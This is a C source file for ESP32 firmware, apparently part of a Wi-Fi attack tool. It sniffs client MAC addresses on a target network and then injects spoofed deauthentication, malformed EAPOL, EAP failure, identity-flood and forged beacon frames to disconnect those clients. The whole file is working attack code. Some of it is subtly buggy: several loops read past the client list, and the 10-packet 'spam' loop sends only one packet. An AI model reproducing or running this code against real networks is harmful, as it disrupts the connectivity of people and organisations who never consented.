#include <string.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include "wifi_attacks.h"

static const char *TAG = "WIFI_ATTACKS:";

static client_t clients[MAX_CLIENTS];
static SemaphoreHandle_t clients_semaphore;
static int num_clients = 0;
static target_info_t target = { 0 };


static void add_client_to_list(const uint8_t *mac) 
{
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Dont add duplicates */
        for (int i = 0; i < num_clients; i++) {
            if (memcmp(clients[i].mac, mac, 6) == 0) {
                xSemaphoreGive(clients_semaphore);
                return;
            }
        }
        if (num_clients < MAX_CLIENTS) 
        {
            memcpy(clients[num_clients].mac, mac, 6);
            num_clients++;
            ESP_LOGI(TAG, "Client aggiunto: %02X:%02X:%02X:%02X:%02X:%02X",
                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        }
        xSemaphoreGive(clients_semaphore);
    }
}


static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) 
{
    if (type != WIFI_PKT_DATA) {
        return;
    }
    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *dest_mac = packet->payload + 4;  // Indirizzo di destinazione
    const uint8_t *src_mac = packet->payload + 10;  // Indirizzo di sorgente
    const uint8_t *bssid = packet->payload + 16;    // BSSID

    if (memcmp(bssid, target.bssid, 6) == 0 && memcmp(dest_mac, target.bssid, 6) == 0)
    {
        add_client_to_list(src_mac);
    }
}


void wifi_attack_engine_start(target_info_t *_target)
{
    /* Init semaphore */
    if (clients_semaphore == NULL) 
    {
        clients_semaphore = xSemaphoreCreateMutex();
    }

    memcpy(&target, _target, sizeof(target_info_t));
    
    /* Reset client count */
    num_clients = 1;
    /* Set first "client" to broadcast address */
    memset(clients[0].mac, 0xFF, 6); 

    /* Start wifi promiscuos mode */
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_ctrl_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
}


void wifi_attack_deauth_basic(void)
{
    static uint8_t reason_code = 5; /* Disassociated because AP is unable to handle all associated stations. */
    uint8_t deauth_packet[26] = {
        0xC0, 0x00, // Frame Control (Deauth)
        0x3A, 0x01, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
        0x00, 0x00, // Sequence Control
        0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
    };
    uint8_t deauth_packet_inverted[26] = {
        0xC0, 0x00, // Frame Control (Deauth)
        0x3A, 0x01, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
        0x00, 0x00, // Sequence Control
        0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
    };
    memcpy(&deauth_packet[10], target.bssid, 6);    // Source Address
    memcpy(&deauth_packet[16], target.bssid, 6);    // BSSID
    memcpy(&deauth_packet_inverted[4], target.bssid, 6);    // Source Address
    memcpy(&deauth_packet_inverted[10], target.bssid, 6);    // BSSID
    deauth_packet[24] = reason_code;
    deauth_packet_inverted[24] = reason_code;

    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        for (int i = 0; i <= num_clients; i++) 
        {
            memcpy(&deauth_packet[4], clients[i].mac, 6);
            memcpy(&deauth_packet_inverted[16], clients[i].mac, 6);
            /* Send simple deauth addr1=client_mac, addr2=ap_mac, addr3=ap_mac */
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
            vTaskDelay(pdMS_TO_TICKS(10));
            /* Send deauth with schemas addr1=ap_mac, addr2=ap_mac, addr3=client_mac */
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet_inverted, sizeof(deauth_packet_inverted), false);
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_client_invalid_PMKID(void)
{
    static uint64_t replay_counter = 2000;
    uint8_t eapol_packet_invalid_PMKID[91] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02,                               // Key Descriptor Type
        0xCA, 0x00,                         // Key Info (Malformato: Install Flag Settato)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Replay Counter
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key Nonce
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key IV
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key RSC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key MIC
        0x00, 0x16, // Key Data Length
        0xDD,       // RSN Tag Number
        0xFF,       // RSN PMKID Tag Length (Corrupted)
        0x00, 0x0F, 0xAC, 0x04, // RSN Information
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // PMKID
    };
    memcpy(&eapol_packet_invalid_PMKID[10], target.bssid, 6);    // Source Address
    memcpy(&eapol_packet_invalid_PMKID[16], target.bssid, 6);    // BSSID
    for (int i = 0; i < 8; i++) {
        eapol_packet_invalid_PMKID[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
    }

    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Skip broadcast address */
        for (int i = 1; i <= num_clients; i++) 
        {
            memcpy(&eapol_packet_invalid_PMKID[4], clients[i].mac, 6); // Destination Address (Client MAC)
            esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
            /* Increase replay counter for next packet */
            replay_counter++;
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_client_bad_msg1(void)
{
    static uint64_t replay_counter = 2000;
    uint8_t eapol_packet_bad_msg1[91] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02,                               // Key Descriptor Type
        0xCA, 0x00,                         // Key Info (Install flag settato)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Replay Counter
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key Nonce
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key IV
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key RSC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key MIC
        0x00, 0x16, // Key Data Length
        0xDD,       // RSN Tag Number
        0x16,       // RSN PMKID Tag Length
        0x00, 0x0F, 0xAC, 0x04, // RSN Information
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // PMKID
    };
    memcpy(&eapol_packet_bad_msg1[10], target.bssid, 6);    // Source Address
    memcpy(&eapol_packet_bad_msg1[16], target.bssid, 6);    // BSSID
    /* Generate random Nonce */
    for (int i = 0; i < 32; i++) {
        eapol_packet_bad_msg1[43 + i] = esp_random() & 0xFF; // Inserisce il valore nel campo Key Nonce
    }
    /* Update replay counter */
    for (int i = 0; i < 8; i++) {
        eapol_packet_bad_msg1[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
    }

    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Skip broadcast address */
        for (int i = 1; i <= num_clients; i++) 
        {
            memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
            esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
            /* Increase replay counter for next packet */
            replay_counter++;
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_ap_eapol_logoff(void)
{
    uint8_t eapol_logoff_packet[33] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02                                // EAPOL-Type (Logoff)
    };
    memcpy(&eapol_logoff_packet[10], target.bssid, 6);    // Source Address
    memcpy(&eapol_logoff_packet[16], target.bssid, 6);    // BSSID
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Skip broadcast address */
        for (int i = 1; i <= num_clients; i++) 
        {
            memcpy(&eapol_logoff_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
            esp_wifi_80211_tx(WIFI_IF_AP, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_client_eap_failure(void)
{
    uint8_t eap_failure_packet[42] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x00, 0x00, 0x00, 0x00,             // EAPOL Packet Length
        0x01,                               // EAP Version
        0x04,                               // EAPOL Type (EAP Failure)
        0x00, 0x04,                         // EAP Length
        0x02,                               // EAP ID
        0x04                                // EAP Code (Failure)
    };
    memcpy(&eap_failure_packet[10], target.bssid, 6);    // Source Address
    memcpy(&eap_failure_packet[16], target.bssid, 6);    // BSSID
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Skip broadcast address */
        for (int i = 1; i <= num_clients; i++) 
        {
            memcpy(&eap_failure_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
            esp_wifi_80211_tx(WIFI_IF_AP, eap_failure_packet, sizeof(eap_failure_packet), false);
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_client_eap_rounds(void)
{
    uint8_t eap_identity_request_packet[42] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x00, 0x00, 0x00, 0x05,             // EAPOL Packet Length
        0x01,                               // EAP Version
        0x01,                               // EAP Code (Request)
        0x01,                               // EAP ID
        0x00, 0x05,                         // EAP Length
        0x01                                // EAP Type (Identity)
    };
    memcpy(&eap_identity_request_packet[10], target.bssid, 6);    // Source Address
    memcpy(&eap_identity_request_packet[16], target.bssid, 6);    // BSSID
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Skip broadcast address */
        for (int i = 1; i <= num_clients; i++) 
        {
            memcpy(&eap_identity_request_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
            for(uint8_t identity = 0; identity < 255; identity++ )
            {
                eap_identity_request_packet[38] = identity;
                esp_wifi_80211_tx(WIFI_IF_AP, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
                vTaskDelay(pdMS_TO_TICKS(1));
            }
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_ap_eapol_start(void)
{
    uint8_t eapol_start_packet[36] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x01, 0x01,                         // EAPOL Version and Type (Start)
        0x00, 0x00                          // EAPOL Length (0 for Start packets)
    };
    memcpy(&eapol_start_packet[10], target.bssid, 6);    // Source Address
    memcpy(&eapol_start_packet[16], target.bssid, 6);    // BSSID
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Skip broadcast address */
        for (int i = 1; i <= num_clients; i++) 
        {
            memcpy(&eapol_start_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
            for(uint8_t burst = 0; burst < 3; burst++ )
            {
                esp_wifi_80211_tx(WIFI_IF_AP, eapol_start_packet, sizeof(eapol_start_packet), false);
                vTaskDelay(pdMS_TO_TICKS(2));
            }
        }
        xSemaphoreGive(clients_semaphore);
    }
}


void wifi_attack_deauth_client_negative_tx_power(void)
{
    uint8_t beacon_frame_negative_tx[256] = {
        0x80, 0x00, // Frame Control (Beacon)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence Control
        0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
        0x64, 0x00, // Beacon Interval (102.4ms)
        0x31, 0x04  // Capability Information
    };
    memcpy(&beacon_frame_negative_tx[10], target.bssid, 6);    // Source Address
    memcpy(&beacon_frame_negative_tx[16], target.bssid, 6);    // BSSID 
    int offset = 36;
    // 2. Tagged Parameters
    // SSID Parameter
    beacon_frame_negative_tx[offset++] = 0x00;          // SSID Tag Number
    beacon_frame_negative_tx[offset++] = strlen((char *)&target.ssid); // SSID Tag Length
    memcpy(beacon_frame_negative_tx + offset, (char *)&target.ssid, strlen((char *)&target.ssid));
    offset += strlen((char *)&target.ssid);

    /* Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps) */
    beacon_frame_negative_tx[offset++] = 0x01;          // Supported Rates Tag Number
    beacon_frame_negative_tx[offset++] = 3;             // Length
    beacon_frame_negative_tx[offset++] = 0x02;          // 1 Mbps
    beacon_frame_negative_tx[offset++] = 0x04;          // 2 Mbps
    beacon_frame_negative_tx[offset++] = 0x0B;          // 5.5 Mbps
    //beacon_frame_negative_tx[offset++] = 0x16;          // 11 Mbps

    // DS Parameter Set (Channel)
    beacon_frame_negative_tx[offset++] = 0x03;          // DS Parameter Set Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = target.channel;       // Channel Number

    // Traffic Indication Map (TIM)
    beacon_frame_negative_tx[offset++] = 0x05;          // TIM Tag Number
    beacon_frame_negative_tx[offset++] = 4;             // Length
    beacon_frame_negative_tx[offset++] = 0x00;          // DTIM Count
    beacon_frame_negative_tx[offset++] = 0x01;          // DTIM Period
    beacon_frame_negative_tx[offset++] = 0x00;          // Bitmap Control
    beacon_frame_negative_tx[offset++] = 0x00;          // Partial Virtual Bitmap

    // // RSN Information (WPA2)
    // uint8_t rsn_info[] = {
    //     0x30,                         // RSN Information Tag Number
    //     0x18,                         // Length
    //     0x01, 0x00,                   // Version
    //     0x00, 0x0F, 0xAC, 0x04,       // Group Cipher Suite (CCMP)
    //     0x01, 0x00,                   // Pairwise Cipher Suite Count
    //     0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher Suite (CCMP)
    //     0x01, 0x00,                   // Authentication Suite Count
    //     0x00, 0x0F, 0xAC, 0x02,       // Authentication Suite (PSK)
    //     0x00, 0x00                    // RSN Capabilities
    // };
    // memcpy(beacon_frame_negative_tx + offset, rsn_info, sizeof(rsn_info));
    // offset += sizeof(rsn_info);

    // TCP Report Transmission Power (TX Power Level)
    beacon_frame_negative_tx[offset++] = 0x33;          // TCP Report TX Power Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = 15;      // TX Power Level

    // Power Constraint
    beacon_frame_negative_tx[offset++] = 0x20;          // Power Constraint Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = -1;             // Power Constraint (Example: 3 dBm)

    /* Spam 10 packets */
    for (int i = 10; i <= 10; i++) 
    {
        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_negative_tx, offset, false);
        vTaskDelay(pdMS_TO_TICKS(2));
    }
}